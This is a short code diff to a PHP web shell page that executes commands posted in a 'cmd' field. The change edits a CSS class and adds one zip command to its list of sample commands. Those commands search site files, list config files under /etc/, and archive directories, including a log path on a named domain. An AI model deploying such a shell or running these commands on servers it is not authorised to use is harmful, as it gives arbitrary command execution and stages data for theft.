@@ -56,11 +56,12 @@ if (!empty($_POST['cmd'])) {
 	    <h1>PHP Shell</h1>
             <h2> Execute a command </h2>
             <pre>
-			<div class=""><?=__DIR__;?></div>
+			<div class="ce"><?=__DIR__;?></div>
 			<div class="ce">grep -rn --include=\*.php 'wp-content' -e 'Template Name'</div>
 			<div class="ce">grep -rn 'catalog' -e 'xxx'</div>
 			<div class="ce">find '/etc/' -name '*.conf'</div>
 			<div class="ce">zip -qr filename.zip folderToZipPath</div>
+			<div class="ce">zip -qr ./filename.zip './local/templates'</div>
 			<div class="ce">find . -cmin -400 -print | zip newZipFile.zip -@</div>
 			<div class="ce">unzip -o filename.zip -d temp -x '\.*' '*/\.*'; echo $?</div>
 			<div class="ce">zip -r /var/www/domains/lustram.ru/system/storage/logs/filename.zip /var/www/domains/lustram.ru/system/storage/logs</div>
